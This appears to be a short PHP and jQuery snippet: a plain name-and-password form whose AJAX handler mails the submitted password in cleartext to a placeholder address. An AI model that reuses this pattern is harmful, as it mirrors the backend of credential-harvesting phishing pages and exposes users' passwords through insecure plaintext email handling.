<?php

function is_ajax()
{
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
}

if (is_ajax() && isset($_POST['password']) && isset($_POST['name'])) {
    // Отправка данных на почту
    $to = "example@example.com"; // Замените на ваш адрес электронной почты
    $subject = "Новая форма отправлена";
    $message = "Имя: " . $_POST['name'] . "\nПароль: " . $_POST['password'];
    $headers = "From: tairdganshimkent@gmail.com"; // Замените на ваш адрес отправителя

    mail($to, $subject, $message, $headers);

    echo json_encode(array(
        'ok' => 'AJAX OK!!!'
    ));
    exit();
}
?>
<html>
 <head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

 </head>
 <body>
    <form id="sub" action='/index.php' method='post'>
    <input type="text" name="name">
    <input type="password" name="password">
    <input type="submit" name="save" >
    </form>


<script>
   $("document").ready(function(){
    $("#sub").submit(function(event){
         event.preventDefault();

       var data = $(this).serialize();
        $.ajax({
            type: "POST",
            dataType: "json",
            url: "index.php",
            data: data,
            success: function(r) {
              console.log(r);
            }
        });
        return false;
    });
});

</script>


 </body>
</html>
